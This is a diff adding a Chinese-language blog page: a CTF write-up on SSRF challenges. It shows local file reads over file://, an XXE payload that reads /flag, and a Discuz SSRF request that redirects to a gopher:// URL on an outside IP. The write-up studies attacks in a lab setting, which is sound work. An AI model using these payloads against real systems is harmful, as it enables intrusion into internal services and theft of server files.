@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="前言一个台湾的ctf平台ssrf题目http://ssrf.orange.tw/ 0x01 File Access经过测试可以使用http、file协议。整体思路就有了 读配置文件-&amp;gt;得到网站根目录-&amp;gt;读源码 尝试读/var/www/html/index.php，结果是phpinfo();。然后去读取/proc/1/cmdlime继续读文件file:///start.sh 得到网站根目">
+<meta name="keywords" content="WriteUp,ssrf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF-WriteUp">
+<meta property="og:url" content="http://yoursite.com/2017/09/01/SSRF-WriteUp/index.html">
+<meta property="og:site_name" content="Windy&#39;s blog">
+<meta property="og:description" content="前言一个台湾的ctf平台ssrf题目http://ssrf.orange.tw/ 0x01 File Access经过测试可以使用http、file协议。整体思路就有了 读配置文件-&amp;gt;得到网站根目录-&amp;gt;读源码 尝试读/var/www/html/index.php，结果是phpinfo();。然后去读取/proc/1/cmdlime继续读文件file:///start.sh 得到网站根目">
+<meta property="og:image" content="http://oksip9gk9.bkt.clouddn.com/20170901150426183332658.png">
+<meta property="og:image" content="http://oksip9gk9.bkt.clouddn.com/20170901150426193819794.png">
+<meta property="og:image" content="http://oksip9gk9.bkt.clouddn.com/2017090115042620021005.png">
+<meta property="og:image" content="http://oksip9gk9.bkt.clouddn.com/20170901150426225844584.png">
+<meta property="og:image" content="http://oksip9gk9.bkt.clouddn.com/20170901150426533945899.png">
+<meta property="og:updated_time" content="2017-09-02T04:41:51.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SSRF-WriteUp">
+<meta name="twitter:description" content="前言一个台湾的ctf平台ssrf题目http://ssrf.orange.tw/ 0x01 File Access经过测试可以使用http、file协议。整体思路就有了 读配置文件-&amp;gt;得到网站根目录-&amp;gt;读源码 尝试读/var/www/html/index.php，结果是phpinfo();。然后去读取/proc/1/cmdlime继续读文件file:///start.sh 得到网站根目">
+<meta name="twitter:image" content="http://oksip9gk9.bkt.clouddn.com/20170901150426183332658.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>SSRF-WriteUp</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Windy&#39;s blog" type="application/atom+xml" />
+    
+</head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2017/10/05/Base64-Expand-Char-GetShell/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li>
+        
+        
+        <li><a class="icon" href="/2017/08/27/CBC-Byte-Flipping-Attack/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2017/09/01/SSRF-WriteUp/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2017/09/01/SSRF-WriteUp/&text=SSRF-WriteUp"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2017/09/01/SSRF-WriteUp/&title=SSRF-WriteUp"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2017/09/01/SSRF-WriteUp/&is_video=false&description=SSRF-WriteUp"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SSRF-WriteUp&body=Check out this article: http://yoursite.com/2017/09/01/SSRF-WriteUp/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2017/09/01/SSRF-WriteUp/&title=SSRF-WriteUp"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2017/09/01/SSRF-WriteUp/&title=SSRF-WriteUp"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2017/09/01/SSRF-WriteUp/&title=SSRF-WriteUp"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2017/09/01/SSRF-WriteUp/&title=SSRF-WriteUp"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2017/09/01/SSRF-WriteUp/&name=SSRF-WriteUp&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-File-Access"><span class="toc-number">2.</span> <span class="toc-text">0x01 File Access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-XXE"><span class="toc-number">3.</span> <span class="toc-text">0x02 XXE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Bonus-ES"><span class="toc-number">4.</span> <span class="toc-text">0x03 Bonus - ES</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-Struts2"><span class="toc-number">5.</span> <span class="toc-text">0x07 Struts2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-Discuz-Pwn"><span class="toc-number">6.</span> <span class="toc-text">0x08 Discuz Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#首先测试gopher协议是否可用"><span class="toc-number">6.1.</span> <span class="toc-text">首先测试gopher协议是否可用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#构造-FastCGI-的-Exp"><span class="toc-number">6.2.</span> <span class="toc-text">构造 FastCGI 的 Exp</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        SSRF-WriteUp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Windy's blog</span>
+      </span>
+      
+    <div class="postdate">
+        <i class="fa fa-calendar-o"></i>
+        <time datetime="2017-09-01T10:06:36.000Z" itemprop="datePublished">2017-09-01</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <span id="/2017/09/01/SSRF-WriteUp/" class="leancloud_visitors" data-flag-title="SSRF-WriteUp">                    
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+            </span>
+            
+            <span class="post-meta-item-text">阅读次数</span>
+            <span class="leancloud-visitors-count"></span>
+        </span>
+    </div>
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/WriteUp/">WriteUp</a>, <a class="tag-link" href="/tags/ssrf/">ssrf</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一个台湾的ctf平台ssrf题目<a href="http://ssrf.orange.tw/" target="_blank" rel="external">http://ssrf.orange.tw/</a></p>
+<h2 id="0x01-File-Access"><a href="#0x01-File-Access" class="headerlink" title="0x01 File Access"></a>0x01 File Access</h2><p>经过测试可以使用http、file协议。整体思路就有了</p>
+<p><code>读配置文件-&gt;得到网站根目录-&gt;读源码</code></p>
+<p>尝试读/var/www/html/index.php，结果是<code>phpinfo();</code>。<br>然后去读取/proc/1/cmdlime<br><img src="http://oksip9gk9.bkt.clouddn.com/20170901150426183332658.png" alt="20170901150426183332658.png"><br>继续读文件<code>file:///start.sh</code></p>
+<p><img src="http://oksip9gk9.bkt.clouddn.com/20170901150426193819794.png" alt="20170901150426193819794.png"><br>得到网站根目录/www，读源码，得到flag<br><img src="http://oksip9gk9.bkt.clouddn.com/2017090115042620021005.png" alt="2017090115042620021005.png"></p>
+<h2 id="0x02-XXE"><a href="#0x02-XXE" class="headerlink" title="0x02 XXE"></a>0x02 XXE</h2><p>使用xxe构造payload读取/flag，幸运的是，file协议同样可以使用</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE xdsec [</span></div><div class="line"><span class="meta">&lt;!ELEMENT methodname ANY &gt;</span></div><div class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "file:///flag" &gt;]&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">methodcall</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">methodname</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">methodname</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">methodcall</span>&gt;</span></div></pre></td></tr></table></figure>
+<p><img src="http://oksip9gk9.bkt.clouddn.com/20170901150426225844584.png" alt="20170901150426225844584.png"></p>
+<h2 id="0x03-Bonus-ES"><a href="#0x03-Bonus-ES" class="headerlink" title="0x03 Bonus - ES"></a>0x03 Bonus - ES</h2><h2 id="0x07-Struts2"><a href="#0x07-Struts2" class="headerlink" title="0x07 Struts2"></a>0x07 Struts2</h2><p>利用ssrf攻击内网服务器</p>
+<h2 id="0x08-Discuz-Pwn"><a href="#0x08-Discuz-Pwn" class="headerlink" title="0x08 Discuz Pwn"></a>0x08 Discuz Pwn</h2><p>利用dz论坛的ssrf来攻击FastCGI</p>
+<h3 id="首先测试gopher协议是否可用"><a href="#首先测试gopher协议是否可用" class="headerlink" title="首先测试gopher协议是否可用"></a>首先测试gopher协议是否可用</h3><p>请求<br><code>http://ssrf.orange.tw:85/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=%5Bimg%3D1%2C1%5Dhttp%3A%2f%2f23.105.206.199%2fgopher.php%3Fa.jpg%5B%2fimg%5D</code><br>其中gopher.php的内容为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">header(<span class="string">"Location: gopher://23.105.206.199:2333/_test"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>服务器监听端口，收到回显。<br><img src="http://oksip9gk9.bkt.clouddn.com/20170901150426533945899.png" alt="20170901150426533945899.png"><br>证明可利用gopher协议扩展攻击</p>
+<h3 id="构造-FastCGI-的-Exp"><a href="#构造-FastCGI-的-Exp" class="headerlink" title="构造 FastCGI 的 Exp"></a>构造 FastCGI 的 Exp</h3><blockquote>
+<p>参考文章<br><a href="http://vinc.top/2016/11/24/%E3%80%90ssrf%E3%80%91ssrfgopher%E6%90%9E%E5%AE%9A%E5%86%85%E7%BD%91%E6%9C%AA%E6%8E%88%E6%9D%83redis/" target="_blank" rel="external">http://vinc.top/2016/11/24/%E3%80%90ssrf%E3%80%91ssrfgopher%E6%90%9E%E5%AE%9A%E5%86%85%E7%BD%91%E6%9C%AA%E6%8E%88%E6%9D%83redis/</a><br><a href="https://joychou.org/web/phpssrf.html" target="_blank" rel="external">https://joychou.org/web/phpssrf.html</a><br><a href="http://www.91ri.org/17111.html" target="_blank" rel="external">http://www.91ri.org/17111.html</a><br><a href="https://blog.chaitin.cn/gopher-attack-surfaces/" target="_blank" rel="external">https://blog.chaitin.cn/gopher-attack-surfaces/</a></p>
+</blockquote>
+
+  </div>
+</article>
+
+      <div id="SOHUCS"></div>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-File-Access"><span class="toc-number">2.</span> <span class="toc-text">0x01 File Access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-XXE"><span class="toc-number">3.</span> <span class="toc-text">0x02 XXE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Bonus-ES"><span class="toc-number">4.</span> <span class="toc-text">0x03 Bonus - ES</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-Struts2"><span class="toc-number">5.</span> <span class="toc-text">0x07 Struts2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-Discuz-Pwn"><span class="toc-number">6.</span> <span class="toc-text">0x08 Discuz Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#首先测试gopher协议是否可用"><span class="toc-number">6.1.</span> <span class="toc-text">首先测试gopher协议是否可用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#构造-FastCGI-的-Exp"><span class="toc-number">6.2.</span> <span class="toc-text">构造 FastCGI 的 Exp</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2017/09/01/SSRF-WriteUp/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2017/09/01/SSRF-WriteUp/&text=SSRF-WriteUp"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2017/09/01/SSRF-WriteUp/&title=SSRF-WriteUp"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2017/09/01/SSRF-WriteUp/&is_video=false&description=SSRF-WriteUp"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SSRF-WriteUp&body=Check out this article: http://yoursite.com/2017/09/01/SSRF-WriteUp/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2017/09/01/SSRF-WriteUp/&title=SSRF-WriteUp"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2017/09/01/SSRF-WriteUp/&title=SSRF-WriteUp"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2017/09/01/SSRF-WriteUp/&title=SSRF-WriteUp"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2017/09/01/SSRF-WriteUp/&title=SSRF-WriteUp"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2017/09/01/SSRF-WriteUp/&name=SSRF-WriteUp&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2015 - 2017 Jack Yang
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-86660611-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+
+<!-- Changyan Comments -->
+
+    <script type="text/javascript">
+        (function(){
+          var appid = 'cytbxr5F5';
+          var conf = 'prod_1b1213b19a954482c87045388c9c7954';
+          var width = window.innerWidth || document.documentElement.clientWidth;
+          if (width < 960) {
+          window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("https://changyan.sohu.com/upload/changyan.js",function(){
+            window.changyan.api.config({appid:appid,conf:conf})});
+          }
+        })();
+        </script>
+        <script type="text/javascript" src="https://assets.changyan.sohu.com/upload/plugins/plugins.count.js"></script>
+
+
+<!-- Disqus Comments -->
+
+
+    <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+    <script>AV.initialize("gXbogVvt7GkTh0IXllnbL00P-gzGzoHsz", "BUk2vE0XC6Uv6mlT4ToIRbGY");</script>
+    <script>
+      function showTime(Counter) {
+        var query = new AV.Query(Counter);
+        var entries = [];
+        var $visitors = $(".leancloud_visitors");
+  
+        $visitors.each(function () {
+          entries.push( $(this).attr("id").trim() );
+        });
+  
+        query.containedIn('url', entries);
+        query.find()
+          .done(function (results) {
+            var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+  
+            if (results.length === 0) {
+              $visitors.find(COUNT_CONTAINER_REF).text(0);
+              return;
+            }
+  
+            for (var i = 0; i < results.length; i++) {
+              var item = results[i];
+              var url = item.get('url');
+              var time = item.get('time');
+              var element = document.getElementById(url);
+  
+              $(element).find(COUNT_CONTAINER_REF).text(time);
+            }
+            for(var i = 0; i < entries.length; i++) {
+              var url = entries[i];
+              var element = document.getElementById(url);
+              var countSpan = $(element).find(COUNT_CONTAINER_REF);
+              if( countSpan.text() == '') {
+                countSpan.text(0);
+              }
+            }
+          })
+          .fail(function (object, error) {
+            console.log("Error: " + error.code + " " + error.message);
+          });
+      }
+  
+      function addCount(Counter) {
+        var $visitors = $(".leancloud_visitors");
+        var url = $visitors.attr('id').trim();
+        var title = $visitors.attr('data-flag-title').trim();
+        var query = new AV.Query(Counter);
+  
+        query.equalTo("url", url);
+        query.find({
+          success: function(results) {
+            if (results.length > 0) {
+              var counter = results[0];
+              counter.fetchWhenSave(true);
+              counter.increment("time");
+              counter.save(null, {
+                success: function(counter) {
+                  var $element = $(document.getElementById(url));
+                  $element.find('.leancloud-visitors-count').text(counter.get('time'));
+                },
+                error: function(counter, error) {
+                  console.log('Failed to save Visitor num, with error message: ' + error.message);
+                }
+              });
+            } else {
+              var newcounter = new Counter();
+              /* Set ACL */
+              var acl = new AV.ACL();
+              acl.setPublicReadAccess(true);
+              acl.setPublicWriteAccess(true);
+              newcounter.setACL(acl);
+              /* End Set ACL */
+              newcounter.set("title", title);
+              newcounter.set("url", url);
+              newcounter.set("time", 1);
+              newcounter.save(null, {
+                success: function(newcounter) {
+                  var $element = $(document.getElementById(url));
+                  $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+                },
+                error: function(newcounter, error) {
+                  console.log('Failed to create');
+                }
+              });
+            }
+          },
+          error: function(error) {
+            console.log('Error:' + error.code + " " + error.message);
+          }
+        });
+      }
+  
+      $(function() {
+        var Counter = AV.Object.extend("Counter");
+        if ($('.leancloud_visitors').length == 1) {
+          addCount(Counter);
+        } else if ($('.post-title-link').length > 1) {
+          showTime(Counter);
+        }
+      });
+    </script>
+  
